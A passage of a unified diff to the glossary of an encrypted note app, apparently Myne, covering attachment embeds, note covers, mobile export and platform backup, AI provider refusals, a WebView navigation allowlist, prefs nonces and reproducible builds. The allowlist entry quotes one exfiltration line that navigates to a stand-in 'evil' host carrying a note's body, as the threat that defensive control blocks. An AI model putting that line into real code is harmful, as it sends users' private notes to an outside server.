@@ -169,6 +169,12 @@ An arbitrary file of **any type** stored as an encrypted blob in the vault, sepa
 
 A [`vault.attachments`](#vaultattachments) entry whose optional `deleted_at` field is set (`spec/protocol.md` §9.10.2): the multi-device **deletion marker** for an [attachment](#attachment) under Phase 2 sync (`spec/sync-protocol.md` §11.4). Written at delete time with the entry's metadata **scrubbed** (filename/content-type emptied, size zeroed) so the synced catalog keeps nothing descriptive about a crypto-erased file; it defeats stale-catalog resurrection in the per-entry merge (the greater [merge version](#merge-version) wins, so a deliberate re-add — which observes the delete — outranks a stale live copy; on an equal-`version` tie the tombstone wins; myne-md/myne#405). Prunable client-side after the [tombstone horizon](#tombstone-horizon). **Distinct from** the [deleted-attachment tombstone](#deleted-attachment-tombstone), which is the *UI placeholder* an editor embed renders for an unresolvable id. Phase 2. (MYND-468)
 
+### **attachment embed** &nbsp; 📦 *Product* *(Myne-divergent: yes; no Obsidian counterpart)*
+
+The Myne form for embedding an encrypted [attachment](#attachment) in a note, `spec/wikilink.md` §2 **form 12**: `![[att:<attachment-id-hex>|filename]]`, historically called **form C**. The `att:` scheme prefix routes resolution to the `vault.attachments` catalog rather than the note index, and the remainder must be a 64-character lowercase-hex [attachment-id](#attachment-id); a prefix with an invalid id is not an attachment embed and degrades to an ordinary embed chip rather than erroring. It renders as an ATOMIC widget with no source-lift, so the caret never enters it and the `att:` target is never exposed as editable text: a user cannot hand-write or hand-edit one inside Myne, and every authoring affordance emits it instead. What it renders as is a serve-time decision (inline image, PDF reader, audio or video player, file card, or a tombstone for an id the catalog cannot resolve), not an ingest gate. It may carry [embed layout segments](#embed-layout-segment). On an attachments-included export it is rewritten to a plain wikilink embed naming the exported file, carrying its layout segments in Obsidian’s own spelling where one exists, so it never reaches Obsidian in this form.
+
+Used in: `spec/wikilink.md` §2 form 12, §2.1, §5.1; `spec/markdown-dialect.md` §6
+
 ### **attachment-id** &nbsp; 📋 *Protocol*
 
 The 32-byte content-addressed identifier of an [attachment](#attachment): `HMAC-SHA-256(DeriveSubkey(root_key, "attachments-id-hmac"), file_bytes)` (`spec/protocol.md` §9.9). Used as the on-disk filename (hex) and the dedup key — identical content yields one blob within a vault. Because it is keyed under `root_key`, a disk observer without the key cannot test whether the vault holds a specific known file (no confirmation oracle) nor link equal content across vaults (`threat-model.md` AS7/AS8). Notes reference it via the editor form-C embed `![[att:<id>|filename]]`. Dedup is an id-existence check, not convergent encryption. (MYND-164)
@@ -459,6 +465,12 @@ Used in: `spec/protocol.md` §3.2, §3.4
 The table in `spec/protocol.md` §3.4 listing every authorized context string and its role for v0.1. Adding a new role in a minor revision means adding a row to the registry, not bumping the protocol version. Registered roles in v0.1: `itemsKey-wrap`, `prefs-key`, `search-index-key`, `attachments-catalog-key`, `attachments-id-hmac` (active), plus `server-auth`, `backup-key`, and `vault-head-mac` (all reserved — derived material unused in v0.1; `backup-key` demoted 2026-06-10; `vault-head-mac` is the Phase 2 [vault head](#vault-head) MAC key, MYND-416). The next major version defines its own HKDF context-string prefix (not pre-allocated).
 
 Used in: `spec/protocol.md` §3.4
+
+### **cover (note)** &nbsp; 📦 *Product*
+
+The image a note displays across the top of the editor, above its title. Stored as the thirteenth Myne-managed canonical frontmatter field, `cover:` (`spec/markdown-dialect.md` §3.6.1), whose value is a **value-strict** form-C [attachment](#attachment) embed: the whole logical value must be exactly one `![[att:<id>|<filename>]]` and nothing else, so a user's own `cover: true` or `cover: photo.png` leaves the note uncovered rather than rendering something broken. Strictness is on the **grammar of the value, not on whether the attachment still resolves** — a deleted referent draws no banner at all (no tombstone, unlike a form-C embed in the body), and a not-yet-loaded catalog reserves the banner's height instead of shifting the text. Written only by the cover set / change / remove actions (`src/notes/setNoteCover.ts`) over the **generic** `patchFrontmatterField`, like the conflict pair; body autosave never touches it. A cover is always a vault attachment: Myne never fetches a remote image, so a URL is not a cover. **Note-level, not per-view** — the saved-view `image` setting still names whichever property a view points at and still reads it leniently, which is why a hand-written value the strict grammar rejects may nonetheless render on a card. Deliberately **not** shown on list surfaces: the sidebar note tree, tabs, search results and the quick picker stay text-first (myne-md/myne#410). See [attachment](#attachment), [saved view](#saved-view).
+
+Used in: `spec/markdown-dialect.md` §3.6.1; `decisions.md` 2026-08-15 "Note cover is a note-level canonical field, and list surfaces stay text-first".
 
 ### **CRDT (Conflict-free Replicated Data Type)** &nbsp; 🏗️ *Construction*
 
@@ -759,9 +771,9 @@ Used in: `decisions.md` 2026-08-08 (first-run example vault)
 
 ### **export** &nbsp; 📦 *Product*
 
-A one-shot, user-initiated operation that decrypts user content and writes it as ordinary **unencrypted** files to a destination the user explicitly chose via the OS file dialog — per-note markdown, the whole-vault markdown tree, attachment files, a rendered PDF, standalone HTML, or stripped plain text (HTML + plain text added by MYND-340). Export is the portability path ("you walk away with your files", `vision.md`): the markdown forms write the stored plaintext **verbatim** (frontmatter included; the only sanctioned mutation is the attachments-mode embed rewrite, `markdown-dialect.md` §6 — HTML's image-sidecar `src` rewrite is the same sanctioned-transform class). PDF/HTML/plain-text are **lossy projections**, not byte-stable round-trips of the source. Terminology wall: an export is never a [vault backup file](#vault-backup-file) (that stays exactly as encrypted as the vault) and never a snapshot (version history). Threat-model framing: a deliberate plaintext crossing of TB3 under user authority — the artifact is outside Myne's protection from the moment it is written (`threat-model.md` §3 TB3, §5). There is no plaintext *mode*: no watch, mirror, or export-on-save exists.
+A one-shot, user-initiated operation that decrypts user content and writes it as ordinary **unencrypted** files: per-note markdown, the whole-vault markdown tree, attachment files, a rendered PDF, standalone HTML, or stripped plain text (HTML + plain text added by MYND-340). Export is the portability path ("you walk away with your files", `vision.md`): the markdown forms write the stored plaintext **verbatim** (frontmatter included; the only sanctioned mutation is the attachments-mode embed rewrite, `markdown-dialect.md` §6 — HTML's image-sidecar `src` rewrite is the same sanctioned-transform class). PDF/HTML/plain-text are **lossy projections**, not byte-stable round-trips of the source. Terminology wall: an export is never a [vault backup file](#vault-backup-file) (that stays exactly as encrypted as the vault) and never a snapshot (version history). **Where the destination comes from is client-specific, and TB3's authority argument rests on it.** On desktop and on the web the user explicitly chooses it via the OS file dialog. **On mobile there is no dialog and no choice**: neither platform offers the WebView one, so the app picks its own `Documents` directory for every plaintext writer, and what the user authorizes there is the export, not where it lands (myne-md/myne#491). That directory is declared excluded from [platform backup](#platform-backup). Threat-model framing: a deliberate plaintext crossing of TB3 under user authority, and the artifact is outside Myne's protection from the moment it is written (`threat-model.md` §3 TB3, §5). There is no plaintext *mode*: no watch, mirror, or export-on-save exists.
 
-Used in: `threat-model.md` §3/§5, `markdown-dialect.md` §6, `decisions.md` 2026-06-11 (export suite)
+Used in: `threat-model.md` §3/§5, `markdown-dialect.md` §6, `decisions.md` 2026-06-11 (export suite), 2026-08-15 (mobile export directory excluded from platform backup)
 
 ### **extended retention** &nbsp; 📦 *Product*
 
@@ -882,7 +894,7 @@ Used in: `decisions.md` 2026-07-13
 
 ### **frontmatter** &nbsp; 📦 *Product*
 
-The optional YAML metadata block delimited by `---` lines at the top of a note's decrypted markdown (`spec/markdown-dialect.md` §3.6). Carries the twelve Myne-managed canonical fields (§3.6.1) plus arbitrary user-authored keys, all preserved byte-for-byte on write (unknown-field-preservation + §6 C1). The editor's recognizer only *delimits* the block; a separate read-only [property](#property) parse (Saved Views / MYND-271) reads the YAML *body* to type each key for the [property index](#property). Not to be confused with the inline `#tag` / frontmatter `tags:` distinction (§3.7).
+The optional YAML metadata block delimited by `---` lines at the top of a note's decrypted markdown (`spec/markdown-dialect.md` §3.6). Carries the thirteen Myne-managed canonical fields (§3.6.1) plus arbitrary user-authored keys, all preserved byte-for-byte on write (unknown-field-preservation + §6 C1). The editor's recognizer only *delimits* the block; a separate read-only [property](#property) parse (Saved Views / MYND-271) reads the YAML *body* to type each key for the [property index](#property). Not to be confused with the inline `#tag` / frontmatter `tags:` distinction (§3.7).
 
 Used in: `spec/markdown-dialect.md` §3.6
 
@@ -926,6 +938,12 @@ Reference: RFC 5869.
 A class of attack where an adversary captures encrypted traffic or storage today, expecting future cryptographic advances (notably quantum computing) to enable decryption later. Myne v0.1 does not provide post-quantum protection; a later major version's roadmap introduces hybrid X25519 + ML-KEM-768 wrap to address HNDL for sync-server scenarios.
 
 Used in: `threat-model.md` §1 (A10 discussion)
+
+### **embed layout segment** &nbsp; 📦 *Product* *(Myne-divergent: yes; keyed segments, and `align=` has no Obsidian counterpart)*
+
+An author's size, alignment or alt-text choice for one embedded attachment, written as an extra **keyed** segment on the form-C [attachment embed](#attachment-embed) (`![[att:<id>|photo.png|w=300|align=center|alt=A sunset]]`; `spec/wikilink.md` §2 form 12 / §5.1, myne#409). The closed vocabulary is `w` (`1..8192` px or `1..100%`), `h` (`1..8192` px), `align` (`left`/`center`/`right`) and `alt` (free text). Three rules bind: **segment 1 is always the filename**, and from segment 2 on an unkeyed segment rejoins it with its `|` (an attachment filename may itself contain a pipe, so a positional reading would corrupt notes already on disk); **`alt=` is terminal**, swallowing the rest of the embed so alt prose may contain pipes, with an authored-EMPTY `alt=` meaning a deliberately decorative image; and an unreadable segment is **dropped without rewriting the note's bytes**, reported to the author when a known key carried a bad value and passed over silently when the key itself is unknown (an unknown key is a newer client's choice read by an older one, not an error the reader can act on). A width is a **maximum intent**: render clamps it to the editor's content column, which is itself a user preference. Segments are authored only through the embed's overflow menu, never typed, because the embed is atomic and never source-lifts. On an attachments-included export a pixel `w` becomes Obsidian's own `|300` / `|300x200` spelling and the rest travels through; `align` is a Myne extension Obsidian has no core syntax for.
+
+Used in: `spec/wikilink.md` §2, §5.1; `spec/markdown-dialect.md` §6, §7; `decisions.md` 2026-08-15
 
 ### **embedded HTML rendering** &nbsp; 📦 *Product*
 
@@ -1273,6 +1291,18 @@ Bytes leaving the machine Myne runs on — as distinct from **loopback**, which 
 
 Used in: `decisions.md` 2026-08-09, 2026-08-04; `dev/ai-no-egress.md`
 
+### **policy refusal** &nbsp; 📦 *Product*
+
+A [remote AI provider](#remote-ai-provider) declining a request under **its own** rules: an account guardrail, a workspace policy, a model the plan does not carry. Its shape is what makes it a term rather than a detail: the provider answers **HTTP 200** and puts an `error` member in the body where the answer belongs, so at the transport layer it is indistinguishable from success. Distinct from a *credential* rejection (401/403), from a *cost* decline (402/429, the quota causes), and from a transport refusal, which is nothing accepting the connection at all. Distinguishing it needs only whether that member is **present**; its text is attacker-influenceable and is never read, logged, stored or shown, because the reply structs type it `Option<serde::de::IgnoredAny>`, which deserializes any value and retains nothing. The user-facing consequence is the reason the term exists: a policy refusal is fixed at the provider, so telling the user to rephrase is wrong advice, and telling them nothing was sent is a false statement, because the note text had already left.
+
+Used in: `decisions.md` 2026-08-15; myne-md/myne#466
+
+### **effective backend** &nbsp; 📦 *Product*
+
+Which AI backend a request **actually** reaches, as opposed to which one the preferences name. The two can differ: selecting the remote arm requires seven conditions to hold at once (developer mode, the AI beta flag, a recognized [AI provider](#ai-provider), matching consent, a stored key, a non-empty model selection, and preferences read from the vault unlocked right now), and any one failing falls back silently to the local arm. Naming a provider satisfies one of the seven, so a caption derived from that alone can claim a backend that answered nothing. Attribution of where a note's text went is a trust surface, so it names this. The separate [trust headline](#trust-headline) deliberately stays on the configured value instead, because over-claiming egress makes a reader cautious while under-claiming tells them their text stayed home when it did not.
+
+Used in: `decisions.md` 2026-08-15; myne-md/myne#466
+
 ### **conversational AI chat** &nbsp; 📦 *Product*
 
 The multi-turn chat surface of the AI Chat right-panel tab (`conversational-ai-chat`, MYND-454): a conversation the user can follow up on, with the assistant's answer **streamed** token-by-token (see [streaming token channel](#streaming-token-channel)) and grounded per-turn in the user's own notes (with visible [chat citations](#chat-citation)). It supersedes the earlier single-shot Q&A box. History is **RAM-only, dropped on lock** — no durable, at-rest chat storage in v0.1 (deferred), so no new magic byte or format. Powered by [local inference](#local-inference) (on-device by default — but chat is precisely the surface a user-named [AI provider](#ai-provider) may serve, including a [remote AI provider](#remote-ai-provider), so "no provider call" no longer holds here after 2026-08-09); the model is small and fallible, which is why answers cite their sources. See `decisions.md` 2026-07-04; `threat-model.md` §7 (STI paragraph).
@@ -1333,6 +1363,16 @@ The IETF group-key-agreement protocol standardized as RFC 9420. Myne plans to us
 
 Used in: `spec/protocol.md` §11 (out of scope for v0.1)
 Reference: RFC 9420.
+
+### **navigation allowlist** &nbsp; 🛠️ *Tooling*
+
+The host-side rule that refuses every WebView navigation to an origin that is not the app's own. A `on_navigation` hook in each Tauri client (`src-tauri/src/navigation.rs`, `mobile/src-tauri/src/navigation.rs`), **not** a CSP directive, and that distinction is the reason it exists: no engine implements a directive that governs a top-level navigation (`navigate-to` was dropped from the spec, and `default-src` falls back only for fetch directives), so no policy written in `tauri.conf.json` can refuse `location = "https://evil/?d=" + noteBody`. The fetch half of that channel is closed by `connect-src`; this closes the navigation half. Landed desktop-side with `decisions.md` 2026-08-04 (entry 0445) and mobile-side with 2026-08-15 (entry 0502).
+
+Three limits are part of the term rather than caveats on it. On Windows the hook sees only top-level navigations, so a sub-frame is bounded by `frame-src` alone. On **Android** the hook is `WebViewClient.shouldOverrideUrlLoading`, which the platform does not call for POST, so a form submission is invisible to the allowlist and is bounded by `form-action 'none'` instead: the allowlist and that directive are complementary, not redundant. And in a dev build the frontend is served by Vite rather than the `tauri://` protocol handler, so no CSP is attached at all and the allowlist is the only one of these controls that runs.
+
+Distinct from the [value-shape allowlist](#value-shape-allowlist), which constrains what a custom theme may *say*, not where the app may *go*.
+
+Used in: `threat-model.md` §7; `decisions.md` 2026-08-04, 2026-08-15
 
 ### **next major version (post-v0.1)** &nbsp; 📦 *Product*
 
@@ -1398,7 +1438,7 @@ Used in: `decisions.md` 2026-07-13
 
 ### **Myne-managed canonical frontmatter field** &nbsp; 📋 *Protocol*
 
-A YAML frontmatter field whose value is written by the Myne dialect surgery module (`src/dialect/surgery.ts`) rather than left purely user-authored. v0.1 defines **twelve** such fields, enumerated in `markdown-dialect.md` §3.6.1 and exported as the single `MANAGED_FRONTMATTER_FIELDS` constant (`dialect/src/managedFields.ts`) that the importers' reject list consumes: `updated` / `title` / `folder` / `trashed` / `template` / `folder_index` / `kind` / `done` / `archived` / `deleted` / `conflict` / `conflict_of`. The first two are the original pair — `updated` (RFC 3339 string, UTC, **autosave-driven** — overwritten on every `note_update` via `patchUpdatedField` to record the user's last-edit timestamp on the device) and `title` (YAML string scalar, **rename-driven** — overwritten only when the user renames a note from the sidebar AND the read-precedence chain resolves to the frontmatter slot, via `patchTitleField`; the `<NoteRow>` sidebar reads from the same field per the mirror-existing source-of-truth decision tree). All are **unprefixed** (no `myne_` namespace) to align with Obsidian / Logseq / Bear convention and the `PRODUCT.md` plain-markdown-portability commitment. Other frontmatter fields (`tags:`, user-defined keys) are user-authored and preserved per `markdown-dialect.md` §3.6 "Unknown frontmatter fields are preserved on write." The set of Myne-managed canonical fields is forward-incompatible-by-design with a later major version.
+A YAML frontmatter field whose value is written by the Myne dialect surgery module (`src/dialect/surgery.ts`) rather than left purely user-authored. v0.1 defines **thirteen** such fields, enumerated in `markdown-dialect.md` §3.6.1 and exported as the single `MANAGED_FRONTMATTER_FIELDS` constant (`dialect/src/managedFields.ts`) that the importers' reject list consumes: `updated` / `title` / `folder` / `trashed` / `template` / `folder_index` / `kind` / `done` / `archived` / `cover` / `deleted` / `conflict` / `conflict_of`. The first two are the original pair — `updated` (RFC 3339 string, UTC, **autosave-driven** — overwritten on every `note_update` via `patchUpdatedField` to record the user's last-edit timestamp on the device) and `title` (YAML string scalar, **rename-driven** — overwritten only when the user renames a note from the sidebar AND the read-precedence chain resolves to the frontmatter slot, via `patchTitleField`; the `<NoteRow>` sidebar reads from the same field per the mirror-existing source-of-truth decision tree). All are **unprefixed** (no `myne_` namespace) to align with Obsidian / Logseq / Bear convention and the `PRODUCT.md` plain-markdown-portability commitment. Other frontmatter fields (`tags:`, user-defined keys) are user-authored and preserved per `markdown-dialect.md` §3.6 "Unknown frontmatter fields are preserved on write." The set of Myne-managed canonical fields is forward-incompatible-by-design with a later major version.
 
 Used in: `spec/markdown-dialect.md` §3.6.1; `decisions.md` 2026-05-07 "User-meaningful timestamp storage path"; `decisions.md` 2026-05-15 "Note title write target"
 
@@ -1591,11 +1631,23 @@ Used in: `vision.md`, `decisions.md`
 
 A short piece of dictated note text captured on the native-SwiftUI Apple Watch companion and relayed to the paired phone over WatchConnectivity, held in a **device-local encrypted queue** (`MYK1`, `spec/protocol.md` §9.18 — one file per capture at `captures/<capture-id>`) until the vault is next unlocked on the phone, at which point it is drained into that vault as an ordinary new note. Sealed under a device-local keychain `wrap_key` (non-biometric, `afterFirstUnlockThisDeviceOnly`; **not** `root_key`-derived, since the queue must be writable while the vault is locked), it is **vault-agnostic** — it binds the per-entry `capture_id` rather than a vault identity, and drains into whichever vault unlocks first. The watch holds no vault keys and runs no crypto (the same outside-the-trust-boundary posture as the home-screen widget); the queue is never synced or backed up. V1 is voice quick-capture only — no reading, editing, or Siri intent. (`decisions.md` 2026-07-12)
 
+### **platform backup** &nbsp; ⚠️ *Threat*
+
+The **operating system's own** automatic copy of an app's files to the vendor's cloud: iCloud Backup on iOS, Auto Backup on Android, both on by default and neither authorized per file by the user. **Not** a Myne feature and not the [vault backup file](#vault-backup-file): the naming collision is unfortunate and worth holding, because every other backup term in this glossary means a copy Myne made deliberately, and this one means a copy the platform made without asking. It matters because it is a second [egress](#off-device-egress) channel across TB3 alongside the [export](#export) the user asked for: both platforms include the app directory Myne writes plaintext exports into, so a saved recovery phrase, which alone reconstructs the vault, was reaching Apple and Google until myne-md/myne#491. Myne declares that one directory excluded on both platforms (`NSURLIsExcludedFromBackupKey` on iOS; `android:dataExtractionRules` plus `android:fullBackupContent`, covering cloud backup **and** device transfer, on Android) and deliberately leaves the **encrypted vault** in the backup, which discloses nothing and is a real recovery path for a user who does not sync. Two limits belong to the term: the exclusion's *effect* has not been observed on a device (the mechanism is in place and `mobile/docs/dev/device-matrix.md` §8 rows 8.9/8.10 own the proof), and copies already taken before it landed cannot be retracted.
+
+Used in: `threat-model.md` §3 (TB3), §4 (A5), §5; `decisions.md` 2026-08-15 (mobile export directory excluded from platform backup)
+
 ### **platform seam** &nbsp; 📦 *Product*
 
-The single internal boundary through which the shared React UI reaches its host platform — `src/platform/`, one module per host capability (`core`, `event`, `dialog`, `opener`, `path`, `window`, `webviewWindow`, `clipboardManager`, `deepLink`). Desktop's implementation re-exports Tauri; the web client's routes the same calls into a wasm Worker. No file under `src/` outside the seam may import `@tauri-apps/*`, and a `pre-commit` hook plus a CI step enforce it. The seam's whole purpose is that the two clients are the **same tree with one substitution**, which is also why a single **contract-test** suite — the [seam contract](#seam-contract) — runs against every implementation rather than each being tested on its own terms.
+The internal boundary through which a client's UI tree reaches its host platform, one module per host capability (`core`, `event`, `dialog`, `opener`, `path`, `window`, `webviewWindow`, `clipboardManager`, `deepLink`). The shared tree's seam is `src/platform/`: desktop's implementation re-exports Tauri, the web client's routes the same calls into a wasm Worker, and that one substitution is what makes the two clients the **same tree** rather than two trees that resemble each other.
 
-Used in: `decisions.md` 2026-07-26 (web E2E policy); `src/platform/`
+Since myne#492 the rule is stated per guarded tree rather than for `src/` alone, and `scripts/check-platform-seam.mjs` enforces it over **eight** roots in `pre-commit` and in CI. Two of them are Tauri hosts and get a seam directory of their own: `src` (`src/platform/`) and `mobile/src` (`mobile/src/platform/`, six modules). The other six get the strictest form, no seam directory at all, so `@tauri-apps/*` is banned outright: `editor/`, `dialect/`, `copy/`, `ornaments/`, `preview/` and `web/src`. The reason is not that those trees have no Tauri consumer, it is that not **every** consumer is one, and a module-scope import lands in a non-Tauri consumer's bundle whether or not the call ever fires.
+
+Mobile's seam is not a substitution point: mobile is a Tauri host on both of its targets, so there is nothing to substitute. It exists to give the guard a boundary to enforce and to keep the twin modules under `mobile/src/lib` byte-identical to their desktop counterparts, which is how a fix reaches both clients. `mobile/src/formfactor/` is a **different** thing that used to share the name: the iOS-versus-Android and phone-versus-tablet PRESENTATION split (see [size class](#size-class)), renamed out of the way so `<tree>/platform/` means one thing in all three clients.
+
+The seam is meant to be pinned by a single contract suite rather than each implementation being tested on its own terms: see [seam contract](#seam-contract), including which implementations it covers today.
+
+Used in: `decisions.md` 2026-07-26 (web E2E policy); `src/platform/`; `mobile/src/platform/`; `web/src/platform/`; `scripts/check-platform-seam.mjs`
 
 ### **plausibly-deniable encryption** &nbsp; ⚠️ *Threat*
 
@@ -1639,11 +1691,30 @@ Signal's post-quantum-augmented X3DH key-agreement protocol, with hybrid X25519 
 
 Used in: `spec/protocol.md` §11 (out of scope for v0.1)
 
+### **prefs chokepoint** &nbsp; 🛠️ *Tooling*
+
+The single function each client routes every `vault.prefs` write through, so that the [prefs-changed nonce](#prefs-changed-nonce) is bumped by the write path itself rather than by the caller. Module-private, named `writePref`, one per client tree (`src/lib/prefs.ts` and `mobile/src/lib/prefs.ts`); a module holding one is a **prefs module**, which is also the set rule 2 of `scripts/check-prefs-nonce.mjs` exempts. It exists because the bump began life as an optional second line beside each setter and was forgotten in 31 of about 56 desktop setters (#251), silently dropping starred favourites and leaving an AI opt-in the open editor never saw. Mobile shipped the pre-#251 shape until myne-md/myne#486. The guard reads call shapes rather than behaviour, so it cannot tell that the chokepoint still bumps, or that it bumps only after the write resolves: the roster loops in `tests/lib/prefsBindings.test.ts` and `mobile/tests/prefs-nonce.test.ts` are the half that can.
+
+Used in: `scripts/check-prefs-nonce.mjs`; `src/lib/prefs.ts`; `mobile/src/lib/prefs.ts`
+
+### **prefs-changed nonce** &nbsp; 🛠️ *Tooling*
+
+> **Not `prefs_nonce`.** The on-disk `prefs_nonce` is the 192-bit **random** AEAD nonce at offset 6 of the `MYP1` header (`spec/protocol.md` §9.5.1), and it is a [nonce](#nonce) in the cryptographic sense: never reused, never predictable, never a counter. The thing this entry defines is a UI refresh signal that never leaves memory, and the code calls it the vault-prefs "changed" nonce for exactly that reason. Two different objects, one unfortunate word.
+
+A monotonic in-memory counter, one per client, advanced after a `vault.prefs` write resolves. It is the mechanism by which sibling `usePrefs` instances learn that a setting changed: each subscribes through `useSyncExternalStore` and re-reads the blob on an advance, so a settings surface and the editor behind it converge on disk truth without sharing state. Bumping it BEFORE the write resolves is a defect rather than an optimisation, because the re-read then races the write and can pull stale disk truth.
+
+**Two sources advance it, and the second is the one a reader will not guess.** The [prefs chokepoint](#prefs-chokepoint) advances it on every local write. The `PREFS_SYNC_APPLIED_EVENT` bridge advances it when the sync loop merges a REMOTE `vault.prefs` change onto disk (`src/screens/Editor.tsx`, `mobile/src/app/flows/EditorFlow.tsx`), which is the only advance with no local write behind it. `scripts/check-prefs-nonce.mjs` matches prefs command literals rather than `bumpPrefsNonce` call sites, so it does not police this and cannot.
+
+**The NOTIFY can be deferred; the counter cannot.** `withPrefsBatch(fn)` (`mobile/src/lib/prefsNonce.ts` and its byte-identical desktop twin `src/notes/prefsNonce.ts`) holds the subscriber notification for the duration of a multi-write user action and delivers one at the end. The counter still increments per write, so it stays monotonic and no subscriber observes a value that skipped a change. The suppression is module-wide rather than per-action, so a concurrent write elsewhere is deferred to the same end point (nothing is lost: subscribers re-read disk truth, not a diff), and a watchdog bounds the wait so a batched write that hangs cannot swallow notifications for the rest of the session. It exists because the awaits between a folder rename's four prefs writes defeat the module's microtask coalescing, which only collapses a synchronous burst. Today only mobile has a call site; the export is present on both twins so a fix reaches both clients, which is the invariant `decisions.md` 2026-08-15 (`clients/0497`) states.
+
+Used in: `src/notes/prefsNonce.ts`; `mobile/src/lib/prefsNonce.ts`; `scripts/check-prefs-nonce.mjs`
+
 ### **prefs_key** &nbsp; 🗝️ *Key/identifier*
 
 The 32-byte AEAD KEK encrypting `vault.prefs`. Derived deterministically from `root_key` via the canonical `DeriveSubkey(root_key, "prefs-key")` helper (`spec/protocol.md` §3.2 + §3.4 registry entry `"myne.v0.1 prefs-key"`). Never persisted; re-derived on each `vault_unlock` (in-pipeline) and on each `set_*` prefs writer call. Independent from `items_key` lineage by design — preserves prefs portability across the later epoch-rotation `items_key` evolution (`decisions.md` 2026-05-27 "Vault preferences blob: root_key-derived prefs_key").
 
 Used in: `spec/protocol.md` §3.4, §9.5; `decisions.md` 2026-05-27 "Vault preferences blob"
+
 ### **preview snapshot** &nbsp; 📦 *Product*
 
 The real Myne interface, captured as data: the editor's own DOM plus every CSS rule the app had loaded, taken from the running desktop client by `e2e/capture/theme-preview.capture.ts` and shipped as the source-consumed `@myne/preview` package. It is what every surface showing a person "how a theme looks" renders — the website's theme builder, the theme gallery, and the `myne-themes` card renderer — instead of the three separately hand-written mock UIs they used before.
@@ -1766,6 +1837,16 @@ Rules are **stored in canonical English and displayed localized**: a file carryi
 
 Used in: `spec/markdown-dialect.md` §3.8.3, §3.8.7; `decisions.md` 2026-07-28
 
+### **reference build environment** &nbsp; 🛠️ *Tooling*
+
+*(Aliases: reference platform.)*
+
+The build environment a published hash is defined against, so that "reproducible" names a property someone can actually check. For the web bundle it is a **`linux/amd64` container built from `web/container/Dockerfile`**, and the qualifier is load-bearing rather than pedantic: cargo hashes `rustc -vV` (whose `host:` line names the build machine's triple) into every crate's `-C metadata`, rustc folds that into `StableCrateId`, and symbol names then feed codegen-unit partitioning. So the same commit built on a different host architecture produces a different wasm artefact, and every content-hashed chunk importing it renames. Reaching the reference platform is not a privilege of matching hardware: an arm64 machine gets the byte-identical result through emulation (`docker buildx --platform linux/amd64`), which is what keeps the check available to every verifier rather than to whoever owns the right CPU. Distinct from building to **serve**: a self-hoster builds natively for their own architecture and needs no comparison, because they read the source themselves. Their users did not, so an instance other people rely on is built in the reference environment or its users are told no published row will match it.
+
+The scope is across hosts and **not yet across time**: the three base images in that Dockerfile are floating tags, so the environment can move under a row written before it moved. `web-bundle-hashes.md` records that residual beside the claim. See also [reproducible builds](#reproducible-builds).
+
+Used in: `web-bundle-hashes.md`; `self-host-web.md`; `decisions.md` 2026-08-15
+
 ### **reference link** &nbsp; 📦 *Product*
 
 A CommonMark link that names a [link reference definition](#link-reference-definition) instead of carrying its URL inline: full `[text][label]`, collapsed `[text][]` (label = the text), or shortcut `[label]`. Myne v0.1 recognizes and **renders** reference links — a usage whose label resolves against a definition shows its visible text as a link and its definition line hides off-cursor — while a dangling reference (no matching definition) stays plain text. Rendering is cursor-aware and byte-preserving (§6 C1); the canonical emit form for new links is the inline `[text](url)`, so reference links are recognized and rendered but **never emitted**. Distinguished from an inline link by the parse tree (a reference link has a `LinkLabel` child or no `URL`); resolution uses the shared collector, since the parser alone emits a node even for a broken full reference. See also [link reference definition](#link-reference-definition), [decoration layer](#decoration-layer).
@@ -1796,7 +1877,9 @@ Used in: `spec/protocol.md` §9.12, §9.11.3; `decisions.md` 2026-06-13
 
 ### **reproducible builds** &nbsp; 🛠️ *Tooling*
 
-Build artifacts that can be regenerated bit-for-bit from public source code by independent third parties. Myne commits to reproducible builds for desktop (Tauri), web, and server binaries — feasible in months for Tauri (vs. ~10 person-years for Chromium-based Electron). Part of the compensating-controls plan in lieu of a paid third-party audit.
+Build artifacts that can be regenerated bit-for-bit from public source code by independent third parties. Part of the compensating-controls plan in lieu of a paid third-party audit.
+
+**Shipped for the web bundle and the server image; not for desktop.** The commitment used to be stated for all three, and `threat-model.md` §6 corrected that on 2026-08-15 (entry 0496) rather than leave a control the project does not have: desktop artifacts are built locally, are not reproducible, and with every `myne-md` repository private have no public source to be reproduced *from*. The web bundle's guarantee carries its own qualifier: it holds in a [reference build environment](#reference-build-environment), not on every host, because the build machine's target triple reaches the emitted wasm (entry 0498).
 
 Used in: `threat-model.md` §6
 Reference: https://reproducible-builds.org
@@ -1845,7 +1928,9 @@ Used in: `threat-model.md` §6, §7
 
 ### **seam contract** &nbsp; 🛠️ *Tooling*
 
-The one assertion suite that pins the behaviour of the [platform seam](#platform-seam) — call shape, error propagation, subscribe/unsubscribe lifecycle, and the typed *unsupported* outcome for every seam module — and is run against **every** implementation (the Tauri one and the web one) in **both** CI lanes (`tests/platform/seam-contract.ts`, driven by `tauri-seam.test.ts` / `web-seam.test.ts`). It exists because the reason the web client gets no mirror of the desktop E2E suite — "it is the same `src/` tree, only the seam differs" — is a *premise*, and an unverified premise is how a divergence ships; the contract turns it into a checked property. It also pins desktop seam behaviour, which nothing pinned before. See also [capability gating](#capability-gating), [single-tab lock](#single-tab-lock).
+The one assertion suite that pins the behaviour of the [platform seam](#platform-seam), meaning call shape, error propagation, subscribe/unsubscribe lifecycle, and the typed *unsupported* outcome for every seam module. It runs against the **desktop and web** implementations in **both** CI lanes (`tests/platform/seam-contract.ts`, driven by `tauri-seam.test.ts` / `web-seam.test.ts`). It exists because the reason the web client gets no mirror of the desktop E2E suite ("it is the same `src/` tree, only the seam differs") is a *premise*, and an unverified premise is how a divergence ships; the contract turns it into a checked property. It also pins desktop seam behaviour, which nothing pinned before. See also [capability gating](#capability-gating), [single-tab lock](#single-tab-lock).
+
+**Known gap, recorded rather than implied away.** The [platform seam](#platform-seam) got a third implementation in myne#492, `mobile/src/platform/`, and it has no contract driver: `tests/platform/` holds two subjects, not three. So the coverage claim above is exact and deliberately narrower than "every implementation", which is what this entry used to say while a third seam shipped outside it. The suite is already parameterised for a third subject (it takes a `supports` set), so closing the gap is a driver file rather than a redesign; until it lands, mobile's seam is verified by its own specs and by the twin-drift warning, not by this contract.
 
 Used in: `decisions.md` 2026-07-26 (web E2E policy); `docs/dev/e2e.md`; `tests/platform/seam-contract.ts`
 
@@ -2014,7 +2099,7 @@ Used in: `decisions.md` 2026-07-26 (web E2E policy); `docs/dev/e2e.md`; `web/src
 
